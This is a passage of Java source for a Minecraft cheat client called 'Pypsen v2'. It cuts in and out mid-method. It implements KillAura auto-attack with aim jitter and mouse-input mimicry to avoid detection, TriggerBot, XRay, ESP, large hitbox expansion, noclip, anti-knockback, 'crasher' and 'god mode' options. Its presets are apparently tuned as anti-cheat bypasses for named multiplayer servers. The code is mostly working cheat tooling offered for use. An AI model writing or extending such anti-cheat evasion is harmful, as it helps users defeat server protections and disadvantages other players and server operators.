                                    if (visualsParticles == 2) particle = net.minecraft.particle.ParticleTypes.FLAME;
                                    else if (visualsParticles == 3) particle = net.minecraft.particle.ParticleTypes.WITCH;
                                    else if (visualsParticles == 4) particle = net.minecraft.particle.ParticleTypes.ENCHANTED_HIT;

                                    for (int i = 0; i < 5; i++) {
                                        mc.world.addParticle(particle, target.getX() + (Math.random() - 0.5), target.getY() + Math.random() * target.getHeight(), target.getZ() + (Math.random() - 0.5), 0, 0, 0);
                                    }
                                }

                                if (auraJump && p.isOnGround()) p.jump();

                                mc.interactionManager.attackEntity(p, target);
                                p.swingHand(Hand.MAIN_HAND);
                                p.resetLastAttackedTicks(); // Reset cooldown
                            }
                        }
                    } else {
                        currentTarget = null;
                        isRotating = false;
                        if (auraSpinBot) p.setYaw(p.getYaw() + 45f);
                    }
                }
            } else {
                if (mc.crosshairTarget != null && mc.crosshairTarget.getType() == HitResult.Type.ENTITY) {
                    Entity e = ((EntityHitResult) mc.crosshairTarget).getEntity();
                    if (e instanceof LivingEntity) currentTarget = (LivingEntity) e;
                } else {
                    currentTarget = null;
                }
                isRotating = false;
                if (auraSpinBot) p.setYaw(p.getYaw() + 45f);
            }

            if (xrayOn != xrayWasOn) {
                mc.worldRenderer.reload();
                xrayWasOn = xrayOn;
            }
        });
    }

    private static float[] getRotations(Entity p, Entity target) {
        double targetX = target.getX();
        double targetZ = target.getZ();
        double targetY = target.getY();

        if (auraPredict) {
            Vec3d v = target.getVelocity();
            targetX += v.x * 2.0;
            targetZ += v.z * 2.0;
        }

        switch (auraTargetPart) {
            case 0 -> targetY += target.getEyeHeight(target.getPose()); // Head
            case 1 -> targetY += target.getHeight() * 0.6; // Chest
            case 2 -> targetY += target.getHeight() * 0.2; // Legs
            case 3 -> {} // Feet
        }

        if (auraAimJitter > 0 || auraRandomize) {
            double jitter = auraRandomize ? Math.max(auraAimJitter, 0.1) : auraAimJitter;
            targetX += (Math.random() - 0.5) * jitter;
            targetY += (Math.random() - 0.5) * jitter;
            targetZ += (Math.random() - 0.5) * jitter;
        }

        double dx = targetX - p.getX();
        double dz = targetZ - p.getZ();
        double dy = targetY - (p.getY() + p.getEyeHeight(p.getPose()));
        double dist = Math.sqrt(dx * dx + dz * dz);
        float yaw = (float) Math.toDegrees(Math.atan2(dz, dx)) - 90.0f;
        float pitch = (float) -Math.toDegrees(Math.atan2(dy, dist));

        // GCD Fix
        float f = MinecraftClient.getInstance().options.getMouseSensitivity().getValue().floatValue() * 0.6f + 0.2f;
        float gcd = f * f * f * 1.2f;
        yaw -= yaw % gcd;
        pitch -= pitch % gcd;

        return new float[]{yaw, pitch};
    }

    private static int getArmorScore(net.minecraft.item.ItemStack stack) {
        if (stack.getItem() instanceof net.minecraft.item.ArmorItem armor) {
            int score = armor.getProtection();
            score += net.minecraft.enchantment.EnchantmentHelper.getLevel(net.minecraft.enchantment.Enchantments.PROTECTION, stack);
            return score;
        }
        return -1;
    }

    private static int getHealthColor(float hp, float maxHp) {
        float ratio = hp / maxHp;
        if (ratio > 0.75f) return 0xFF00FF00; // Green
        if (ratio > 0.5f) return 0xFFFFFF00;  // Yellow
        if (ratio > 0.25f) return 0xFFFF8800; // Orange
        return 0xFFFF0000;                    // Red
    }

    private static double getAngleDifference(Entity p, Entity e) {
        float[] rots = getRotations(p, e);
        return Math.abs(p.getYaw() - rots[0]);
    }

    private static final Set<Integer> pressedKeys = new HashSet<>();
    private static boolean wasPressed(long handle, int key) {
        if (key == GLFW.GLFW_KEY_UNKNOWN) return false;
        boolean down = GLFW.glfwGetKey(handle, key) == GLFW.GLFW_PRESS;
        if (down && pressedKeys.add(key)) return true;
        if (!down) pressedKeys.remove(key);
        return false;
    }

    public static String keyName(int key) {
        if (key == GLFW.GLFW_KEY_UNKNOWN) return "NONE";
        String name = GLFW.glfwGetKeyName(key, 0);
        if (name != null) return name.toUpperCase();
        return switch (key) {
            case GLFW.GLFW_KEY_MINUS       -> "MINUS";
            case GLFW.GLFW_KEY_LEFT_SHIFT  -> "LSHIFT";
            case GLFW.GLFW_KEY_RIGHT_SHIFT -> "RSHIFT";
            case GLFW.GLFW_KEY_LEFT_CONTROL-> "LCTRL";
            case GLFW.GLFW_KEY_SPACE       -> "SPACE";
            case GLFW.GLFW_KEY_TAB         -> "TAB";
            default -> "KEY_" + key;
        };
    }

    // ══════════ CONFIG SYSTEM ══════════
    public static void saveConfig() {
        try {
            File file = new File(MinecraftClient.getInstance().runDirectory, "pypsen_config.txt");
            FileWriter writer = new FileWriter(file);
            writer.write("speedVal=" + speedVal + "\n");
            writer.write("auraRange=" + auraRange + "\n");
            writer.write("hitboxVal=" + hitboxVal + "\n");
            writer.write("flySpeed=" + flySpeed + "\n");
            writer.write("clickerCps=" + clickerCps + "\n");
            writer.write("triggerCps=" + triggerCps + "\n");
            writer.write("auraMode=" + auraMode + "\n");
            writer.write("auraBypass=" + auraBypass + "\n");
            writer.write("speedBypass=" + speedBypass + "\n");
            writer.write("flyBypass=" + flyBypass + "\n");
            writer.write("auraRotMode=" + auraRotMode + "\n");
            writer.write("auraTargetMode=" + auraTargetMode + "\n");
            writer.write("auraTimingMode=" + auraTimingMode + "\n");
            writer.write("auraTargetPart=" + auraTargetPart + "\n");
            writer.write("visualsTargetMode=" + visualsTargetMode + "\n");
            writer.write("auraAimJitter=" + auraAimJitter + "\n");
            writer.write("auraStickiness=" + auraStickiness + "\n");
            writer.write("auraRotCurve=" + auraRotCurve + "\n");
            writer.write("auraRotSpeed=" + auraRotSpeed + "\n");
            writer.write("auraFov=" + auraFov + "\n");
            writer.write("triggerRange=" + triggerRange + "\n");
            writer.write("auraTargetPlayers=" + auraTargetPlayers + "\n");
            writer.write("auraTargetMobs=" + auraTargetMobs + "\n");
            writer.write("auraTargetAnimals=" + auraTargetAnimals + "\n");
            writer.write("autoWeapon=" + autoWeapon + "\n");
            writer.write("criticals=" + criticals + "\n");
            writer.write("auraThroughWalls=" + auraThroughWalls + "\n");
            writer.write("auraHitInGuis=" + auraHitInGuis + "\n");
            writer.write("auraSpinBot=" + auraSpinBot + "\n");
            writer.write("triggerWeaponOnly=" + triggerWeaponOnly + "\n");
            writer.write("autoTotemOn=" + autoTotemOn + "\n");
            writer.write("autoTotemHealth=" + autoTotemHealth + "\n");
            writer.write("autoTotemMode=" + autoTotemMode + "\n");
            writer.write("aimLockOn=" + aimLockOn + "\n");
            writer.write("antiBotOn=" + antiBotOn + "\n");
            writer.write("fullBrightOn=" + fullBrightOn + "\n");
            writer.write("nameHiderOn=" + nameHiderOn + "\n");
            writer.write("spiderOn=" + spiderOn + "\n");
            writer.write("spiderMode=" + spiderMode + "\n");
            writer.write("noWebOn=" + noWebOn + "\n");
            writer.write("noWebMode=" + noWebMode + "\n");
            writer.write("freezeOn=" + freezeOn + "\n");
            writer.write("freezeMode=" + freezeMode + "\n");
            writer.write("airJumpOn=" + airJumpOn + "\n");
            writer.write("airJumpMode=" + airJumpMode + "\n");
            writer.write("noFallOn=" + noFallOn + "\n");
            writer.write("noFallMode=" + noFallMode + "\n");
            writer.write("velocityMode=" + velocityMode + "\n");
            writer.write("jesusOn=" + jesusOn + "\n");
            writer.write("jesusMode=" + jesusMode + "\n");
            writer.write("visualsParticles=" + visualsParticles + "\n");
            writer.write("waterCrits=" + waterCrits + "\n");
            writer.write("crasherTimerMode=" + crasherTimerMode + "\n");
            writer.write("godModeMode=" + godModeMode + "\n");
            writer.write("seeInvisOn=" + seeInvisOn + "\n");
            writer.write("noFireOn=" + noFireOn + "\n");
            writer.write("noNauseaOn=" + noNauseaOn + "\n");
            writer.write("targetEspOn=" + targetEspOn + "\n");
            writer.write("noHurtCamOn=" + noHurtCamOn + "\n");
            writer.write("playerEspOn=" + playerEspOn + "\n");
            writer.write("friends=" + String.join(",", friends) + "\n");
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void loadConfig() {
        try {
            File file = new File(MinecraftClient.getInstance().runDirectory, "pypsen_config.txt");
            if (!file.exists()) return;
            List<String> lines = Files.readAllLines(file.toPath());
            for (String line : lines) {
                String[] parts = line.split("=");
                if (parts.length < 2) continue;
                String key = parts[0];
                String val = parts[1];
                switch (key) {
                    case "speedVal" -> speedVal = Float.parseFloat(val);
                    case "auraRange" -> auraRange = Float.parseFloat(val);
                    case "hitboxVal" -> hitboxVal = Float.parseFloat(val);
                    case "flySpeed" -> flySpeed = Float.parseFloat(val);
                    case "clickerCps" -> clickerCps = Float.parseFloat(val);
                    case "triggerCps" -> triggerCps = Float.parseFloat(val);
                    case "auraMode" -> auraMode = Integer.parseInt(val);
                    case "auraBypass" -> auraBypass = Integer.parseInt(val);
                    case "speedBypass" -> speedBypass = Integer.parseInt(val);
                    case "flyBypass" -> flyBypass = Integer.parseInt(val);
                    case "auraRotMode" -> auraRotMode = Integer.parseInt(val);
                    case "auraTargetMode" -> auraTargetMode = Integer.parseInt(val);
                    case "auraTimingMode" -> auraTimingMode = Integer.parseInt(val);
                    case "auraTargetPart" -> auraTargetPart = Integer.parseInt(val);
                    case "visualsTargetMode" -> visualsTargetMode = Integer.parseInt(val);
                    case "auraAimJitter" -> auraAimJitter = Float.parseFloat(val);
                    case "auraStickiness" -> auraStickiness = Float.parseFloat(val);
                    case "auraRotCurve" -> auraRotCurve = Float.parseFloat(val);
                    case "auraRotSpeed" -> auraRotSpeed = Float.parseFloat(val);
                    case "auraFov" -> auraFov = Float.parseFloat(val);
                    case "triggerRange" -> triggerRange = Float.parseFloat(val);
                    case "auraTargetPlayers" -> auraTargetPlayers = Boolean.parseBoolean(val);
                    case "auraTargetMobs" -> auraTargetMobs = Boolean.parseBoolean(val);
                    case "auraTargetAnimals" -> auraTargetAnimals = Boolean.parseBoolean(val);
                    case "autoWeapon" -> autoWeapon = Boolean.parseBoolean(val);
                    case "criticals" -> criticals = Boolean.parseBoolean(val);
                    case "auraThroughWalls" -> auraThroughWalls = Boolean.parseBoolean(val);
                    case "auraHitInGuis" -> auraHitInGuis = Boolean.parseBoolean(val);
                    case "auraSpinBot" -> auraSpinBot = Boolean.parseBoolean(val);
                    case "triggerWeaponOnly" -> triggerWeaponOnly = Boolean.parseBoolean(val);
                    case "autoTotemOn" -> autoTotemOn = Boolean.parseBoolean(val);
                    case "autoTotemHealth" -> autoTotemHealth = Float.parseFloat(val);
                    case "autoTotemMode" -> autoTotemMode = Integer.parseInt(val);
                    case "aimLockOn" -> aimLockOn = Boolean.parseBoolean(val);
                    case "antiBotOn" -> antiBotOn = Boolean.parseBoolean(val);
                    case "fullBrightOn" -> fullBrightOn = Boolean.parseBoolean(val);
                    case "nameHiderOn" -> nameHiderOn = Boolean.parseBoolean(val);
                    case "spiderOn" -> spiderOn = Boolean.parseBoolean(val);
                    case "spiderMode" -> spiderMode = Integer.parseInt(val);
                    case "noWebOn" -> noWebOn = Boolean.parseBoolean(val);
                    case "noWebMode" -> noWebMode = Integer.parseInt(val);
                    case "freezeOn" -> freezeOn = Boolean.parseBoolean(val);
                    case "freezeMode" -> freezeMode = Integer.parseInt(val);
                    case "airJumpOn" -> airJumpOn = Boolean.parseBoolean(val);
                    case "airJumpMode" -> airJumpMode = Integer.parseInt(val);
                    case "noFallOn" -> noFallOn = Boolean.parseBoolean(val);
                    case "noFallMode" -> noFallMode = Integer.parseInt(val);
                    case "velocityMode" -> velocityMode = Integer.parseInt(val);
                    case "jesusOn" -> jesusOn = Boolean.parseBoolean(val);
                    case "jesusMode" -> jesusMode = Integer.parseInt(val);
                    case "visualsParticles" -> visualsParticles = Integer.parseInt(val);
                    case "waterCrits" -> waterCrits = Boolean.parseBoolean(val);
                    case "crasherTimerMode" -> crasherTimerMode = Integer.parseInt(val);
                    case "godModeMode" -> godModeMode = Integer.parseInt(val);
                    case "seeInvisOn" -> seeInvisOn = Boolean.parseBoolean(val);
                    case "noFireOn" -> noFireOn = Boolean.parseBoolean(val);
                    case "noNauseaOn" -> noNauseaOn = Boolean.parseBoolean(val);
                    case "targetEspOn" -> targetEspOn = Boolean.parseBoolean(val);
                    case "noHurtCamOn" -> noHurtCamOn = Boolean.parseBoolean(val);
                    case "playerEspOn" -> playerEspOn = Boolean.parseBoolean(val);
                    case "friends" -> {
                        friends.clear();
                        if (!val.isEmpty()) friends.addAll(Arrays.asList(val.split(",")));
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ══════════ XRAY SCREEN ══════════
    public static class XrayScreen extends Screen {
        private final Screen parent;
        private net.minecraft.client.gui.widget.TextFieldWidget searchField;
        private int scroll = 0;
        private final List<Block> allBlocks = new ArrayList<>();
        private final List<Block> filteredBlocks = new ArrayList<>();

        public XrayScreen(Screen parent) {
            super(Text.literal("XRay Blocks"));
            this.parent = parent;
            Registries.BLOCK.forEach(b -> {
                if (b != Blocks.AIR && b != Blocks.CAVE_AIR && b != Blocks.VOID_AIR) {
                    allBlocks.add(b);
                }
            });
            allBlocks.sort(Comparator.comparing(b -> b.getName().getString()));
            filteredBlocks.addAll(allBlocks);
        }

        @Override
        protected void init() {
            addDrawableChild(ButtonWidget.builder(Text.literal("<- Back"), b -> {
                MinecraftClient.getInstance().setScreen(parent);
                MinecraftClient.getInstance().worldRenderer.reload();
            }).dimensions(10, 10, 60, 20).build());

            searchField = new net.minecraft.client.gui.widget.TextFieldWidget(textRenderer, width / 2 - 100, 10, 200, 20, Text.literal("Search"));
            searchField.setChangedListener(text -> {
                filteredBlocks.clear();
                String q = text.toLowerCase();
                for (Block b : allBlocks) {
                    if (b.getName().getString().toLowerCase().contains(q)) {
                        filteredBlocks.add(b);
                    }
                }
                scroll = 0;
            });
            addDrawableChild(searchField);
        }

        @Override
        public void render(DrawContext ctx, int mx, int my, float d) {
            renderBackground(ctx);
            super.render(ctx, mx, my, d);

            int y = 40 + scroll;
            int x = width / 2 - 100;

            for (int i = 0; i < filteredBlocks.size(); i++) {
                if (y > 30 && y < height - 20) {
                    Block b = filteredBlocks.get(i);
                    boolean on = XRAY_BLOCKS.contains(b);
                    String name = b.getName().getString();
                    if (name.length() > 25) name = name.substring(0, 25) + "..";

                    boolean hovered = mx >= x && mx <= x + 200 && my >= y && my <= y + 20;
                    ctx.fill(x, y, x + 200, y + 20, on ? 0x7700FF00 : (hovered ? 0x77555555 : 0x77000000));
                    ctx.drawTextWithShadow(textRenderer, name, x + 5, y + 6, 0xFFFFFF);
                    ctx.drawTextWithShadow(textRenderer, on ? "ON" : "OFF", x + 175, y + 6, on ? 0x55FF55 : 0xFF5555);
                }
                y += 22;
            }
        }

        @Override
        public boolean mouseClicked(double mx, double my, int button) {
            if (super.mouseClicked(mx, my, button)) return true;
            int y = 40 + scroll;
            int x = width / 2 - 100;
            for (int i = 0; i < filteredBlocks.size(); i++) {
                if (y > 30 && y < height - 20) {
                    if (mx >= x && mx <= x + 200 && my >= y && my <= y + 20) {
                        Block b = filteredBlocks.get(i);
                        if (XRAY_BLOCKS.contains(b)) XRAY_BLOCKS.remove(b);
                        else XRAY_BLOCKS.add(b);
                        return true;
                    }
                }
                y += 22;
            }
            return false;
        }

        @Override
        public boolean mouseScrolled(double mx, double my, double amount) {
            scroll += (int)(amount * 22);
            if (scroll > 0) scroll = 0;
            int maxScroll = -(filteredBlocks.size() * 22 - (height - 60));
            if (maxScroll > 0) maxScroll = 0;
            if (scroll < maxScroll) scroll = maxScroll;
            return true;
        }
    }

    // ══════════ MAIN MENU SCREEN ══════════
    public static class MenuScreen extends Screen {
        private int scroll = 0;
        private int bindingTarget = -1;

        public MenuScreen() { super(Text.literal("Pypsen v2")); }

        @Override
        protected void init() { buildWidgets(); }

        private void applyPreset(String preset) {
            switch (preset) {
                case "Funtime" -> {
                    auraRange = 3.0f; auraMode = 0; auraRotMode = 2; auraBypass = 7;
                    hitboxVal = 0.1f; velocityOn = true; antiFlagOn = true; auraThroughWalls = false;
                    speedBypass = 7; flyBypass = 7; auraHitInGuis = false; autoWeapon = true; criticals = true;
                }
                case "ReallyWorld" -> {
                    auraRange = 3.0f; auraMode = 0; auraRotMode = 1; auraBypass = 8;
                    hitboxVal = 0.1f; velocityOn = true; antiFlagOn = true; auraThroughWalls = false;
                    speedBypass = 8; flyBypass = 8; auraHitInGuis = false; autoWeapon = true; criticals = true;
                }
                case "Test" -> {
                    auraRange = 3.5f; auraMode = 0; auraRotMode = 2; auraBypass = 4;
                    hitboxVal = 0.5f; velocityOn = false; antiFlagOn = true; auraThroughWalls = false;
                    speedBypass = 4; flyBypass = 4; auraHitInGuis = true; autoWeapon = false; criticals = false;
                }
                case "HvH" -> {
                    auraRange = 6.0f; auraMode = 1; auraRotMode = 3; auraBypass = 0;
                    hitboxVal = 2.0f; velocityOn = true; antiFlagOn = false; auraThroughWalls = true;
                    speedBypass = 0; flyBypass = 0; auraHitInGuis = true; autoWeapon = true; criticals = true;
                }
            }
            rebuild();
        }

        private void buildWidgets() {
            clearChildren();
            int x = width / 2 - 105;
            int y = 30 + scroll;
            int w = 210;

            // Save Config Button
            addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7b\u25BC Save Config to Documents \u25BC"), b -> {
                saveConfig();
            }).dimensions(x, y, w, 20).build()); y += 26;

            addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7d\u2728 Switch to Modern GUI \u2728"), b -> {
                useModernGui = true;
                if (client != null) client.setScreen(new ModernGuiScreen());
            }).dimensions(x, y, w, 20).build()); y += 26;

            addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7e--- PRESETS ---"), b -> {}).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Funtime"), b -> applyPreset("Funtime")).dimensions(x, y, w/2 - 2, 20).build());
            addDrawableChild(ButtonWidget.builder(Text.literal("ReallyWorld"), b -> applyPreset("ReallyWorld")).dimensions(x + w/2 + 4, y, w/2 - 4, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Test"), b -> applyPreset("Test")).dimensions(x, y, w/2 - 2, 20).build());
            addDrawableChild(ButtonWidget.builder(Text.literal("HvH"), b -> applyPreset("HvH")).dimensions(x + w/2 + 4, y, w/2 - 4, 20).build()); y += 26;

            y = section(x, y, w, "KillAura", auraOn, b -> { auraOn = !auraOn; rebuild(); }, keyAura, 1);
            addDrawableChild(slider(x, y, w, "Range", 1f, 20f, auraRange, v -> auraRange = v)); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Mode", AURA_MODES, auraMode, v -> { auraMode = v; rebuild(); })); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Target", AURA_TARGETS, auraTargetMode, v -> { auraTargetMode = v; rebuild(); })); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Rotation", AURA_ROTS, auraRotMode, v -> { auraRotMode = v; rebuild(); })); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Timing", AURA_TIMINGS, auraTimingMode, v -> { auraTimingMode = v; rebuild(); })); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Aim Part", AURA_PARTS, auraTargetPart, v -> { auraTargetPart = v; rebuild(); })); y += 22;
            addDrawableChild(slider(x, y, w, "Aim Jitter", 0f, 1f, auraAimJitter, v -> auraAimJitter = v)); y += 22;
            addDrawableChild(slider(x, y, w, "Stickiness", 0f, 100f, auraStickiness, v -> auraStickiness = v)); y += 22;
            addDrawableChild(slider(x, y, w, "Rot Curve", 0f, 100f, auraRotCurve, v -> auraRotCurve = v)); y += 22;
            addDrawableChild(slider(x, y, w, "Rot Speed", 1f, 180f, auraRotSpeed, v -> auraRotSpeed = v)); y += 22;
            addDrawableChild(slider(x, y, w, "FOV", 10f, 360f, auraFov, v -> auraFov = v)); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Predict: " + (auraPredict ? "§aON" : "§cOFF")), b -> { auraPredict = !auraPredict; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Randomize: " + (auraRandomize ? "§aON" : "§cOFF")), b -> { auraRandomize = !auraRandomize; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Bypass", BYPASS_NAMES, auraBypass, v -> { auraBypass = v; rebuild(); })); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Target Players: " + (auraTargetPlayers ? "\u00a7aON" : "\u00a7cOFF")), b -> { auraTargetPlayers = !auraTargetPlayers; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Target Mobs: " + (auraTargetMobs ? "\u00a7aON" : "\u00a7cOFF")), b -> { auraTargetMobs = !auraTargetMobs; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Target Animals: " + (auraTargetAnimals ? "\u00a7aON" : "\u00a7cOFF")), b -> { auraTargetAnimals = !auraTargetAnimals; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("AutoWeapon: " + (autoWeapon ? "\u00a7aON" : "\u00a7cOFF")), b -> { autoWeapon = !autoWeapon; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Criticals: " + (criticals ? "\u00a7aON" : "\u00a7cOFF")), b -> { criticals = !criticals; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Water Crits: " + (waterCrits ? "\u00a7aON" : "\u00a7cOFF")), b -> { waterCrits = !waterCrits; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Jump & Attack: " + (auraJump ? "\u00a7aON" : "\u00a7cOFF")), b -> { auraJump = !auraJump; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Through Walls: " + (auraThroughWalls ? "\u00a7aON" : "\u00a7cOFF")), b -> { auraThroughWalls = !auraThroughWalls; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Hit in GUIs: " + (auraHitInGuis ? "\u00a7aON" : "\u00a7cOFF")), b -> { auraHitInGuis = !auraHitInGuis; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("AntiBot: " + (antiBotOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { antiBotOn = !antiBotOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("SpinBot (Idle): " + (auraSpinBot ? "\u00a7aON" : "\u00a7cOFF")), b -> { auraSpinBot = !auraSpinBot; rebuild(); }).dimensions(x, y, w, 20).build()); y += 26;

            y = section(x, y, w, "Visuals (ESP)", visualsOn, b -> { visualsOn = !visualsOn; rebuild(); }, keyVisuals, 8);
            addDrawableChild(cycleBtn(x, y, w, "Target", VISUALS_TARGETS, visualsTargetMode, v -> { visualsTargetMode = v; rebuild(); })); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Particles", PARTICLES_MODES, visualsParticles, v -> { visualsParticles = v; rebuild(); })); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Player ESP (Tags): " + (playerEspOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { playerEspOn = !playerEspOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("FullBright: " + (fullBrightOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { fullBrightOn = !fullBrightOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("NameHider (Record): " + (nameHiderOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { nameHiderOn = !nameHiderOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("See Invisibles: " + (seeInvisOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { seeInvisOn = !seeInvisOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("No Fire: " + (noFireOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { noFireOn = !noFireOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("No Nausea: " + (noNauseaOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { noNauseaOn = !noNauseaOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Target ESP: " + (targetEspOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { targetEspOn = !targetEspOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("NoHurtCam: " + (noHurtCamOn ? "\u00a7aON" : "\u00a7cOFF")), b -> { noHurtCamOn = !noHurtCamOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 26;

            y = section(x, y, w, "TriggerBot", triggerBotOn, b -> { triggerBotOn = !triggerBotOn; rebuild(); }, keyTriggerBot, 13);
            addDrawableChild(slider(x, y, w, "CPS", 1f, 50f, triggerCps, v -> triggerCps = v)); y += 22;
            addDrawableChild(slider(x, y, w, "Range", 1f, 6f, triggerRange, v -> triggerRange = v)); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Weapon Only: " + (triggerWeaponOnly ? "\u00a7aON" : "\u00a7cOFF")), b -> { triggerWeaponOnly = !triggerWeaponOnly; rebuild(); }).dimensions(x, y, w, 20).build()); y += 26;

            y = section(x, y, w, "AutoTotem", autoTotemOn, b -> { autoTotemOn = !autoTotemOn; rebuild(); }, keyAutoTotem, 16);
            addDrawableChild(slider(x, y, w, "Health", 1f, 20f, autoTotemHealth, v -> autoTotemHealth = v)); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Mode", TOTEM_MODES, autoTotemMode, v -> { autoTotemMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "AutoClicker", autoClickerOn, b -> { autoClickerOn = !autoClickerOn; rebuild(); }, keyAutoClicker, 10);
            addDrawableChild(slider(x, y, w, "CPS", 1f, 50f, clickerCps, v -> clickerCps = v)); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Right Click: " + (autoClickerRight ? "§aON" : "§cOFF")), b -> { autoClickerRight = !autoClickerRight; rebuild(); }).dimensions(x, y, w, 20).build()); y += 22;
            addDrawableChild(ButtonWidget.builder(Text.literal("Farm Mode: " + (autoClickerFarm ? "§aON" : "§cOFF")), b -> { autoClickerFarm = !autoClickerFarm; rebuild(); }).dimensions(x, y, w, 20).build()); y += 26;

            y = section(x, y, w, "FreeCam", freecamOn, b -> {
                freecamOn = !freecamOn;
                if (freecamOn && MinecraftClient.getInstance().player != null) {
                    freecamPos = MinecraftClient.getInstance().player.getPos();
                    freecamYaw = MinecraftClient.getInstance().player.getYaw();
                    freecamPitch = MinecraftClient.getInstance().player.getPitch();
                } else if (!freecamOn && MinecraftClient.getInstance().player != null) {
                    MinecraftClient.getInstance().player.noClip = false;
                    MinecraftClient.getInstance().player.getAbilities().flying = false;
                    if (freecamPos != null) {
                        MinecraftClient.getInstance().player.setPosition(freecamPos);
                        MinecraftClient.getInstance().player.setYaw(freecamYaw);
                        MinecraftClient.getInstance().player.setPitch(freecamPitch);
                        MinecraftClient.getInstance().player.setVelocity(0, 0, 0);
                    }
                }
                rebuild();
            }, keyFreecam, 15); y += 26;

            y = section(x, y, w, "AimAssist", aimOn, b -> { aimOn = !aimOn; rebuild(); }, keyAim, 6);
            addDrawableChild(slider(x, y, w, "Smooth Speed", 1f, 100f, aimSpeed, v -> aimSpeed = v)); y += 26;

            y = section(x, y, w, "\u00a75AimLock (Hard Lock)", aimLockOn, b -> { aimLockOn = !aimLockOn; rebuild(); }, keyAimLock, 17); y += 4;

            y = section(x, y, w, "Hitbox", hitboxOn, b -> { hitboxOn = !hitboxOn; rebuild(); }, keyHitbox, 2);
            addDrawableChild(slider(x, y, w, "Size (Cube)", 0.1f, 1000f, hitboxVal, v -> hitboxVal = v)); y += 26;

            y = section(x, y, w, "Velocity (Anti-KB)", velocityOn, b -> { velocityOn = !velocityOn; rebuild(); }, keyVelocity, 5);
            addDrawableChild(cycleBtn(x, y, w, "Mode", VELOCITY_MODES, velocityMode, v -> { velocityMode = v; rebuild(); })); y += 26;
            y = section(x, y, w, "Strafe", strafeOn, b -> { strafeOn = !strafeOn; rebuild(); }, keyStrafe, 7); y += 4;
            y = section(x, y, w, "Noclip", noclipOn, b -> { noclipOn = !noclipOn; rebuild(); }, keyNoclip, 11);
            addDrawableChild(cycleBtn(x, y, w, "Mode", NOCLIP_MODES, noclipBypass, v -> { noclipBypass = v; rebuild(); })); y += 26;
            y = section(x, y, w, "Anti-Flag", antiFlagOn, b -> { antiFlagOn = !antiFlagOn; rebuild(); }, keyAntiFlag, 12); y += 4;

            y = section(x, y, w, "Spider", spiderOn, b -> { spiderOn = !spiderOn; rebuild(); }, keySpider, 18);
            addDrawableChild(cycleBtn(x, y, w, "Mode", SPIDER_MODES, spiderMode, v -> { spiderMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "NoWeb", noWebOn, b -> { noWebOn = !noWebOn; rebuild(); }, keyNoWeb, 19);
            addDrawableChild(cycleBtn(x, y, w, "Mode", NOWEB_MODES, noWebMode, v -> { noWebMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "Freeze", freezeOn, b -> { freezeOn = !freezeOn; rebuild(); }, keyFreeze, 20);
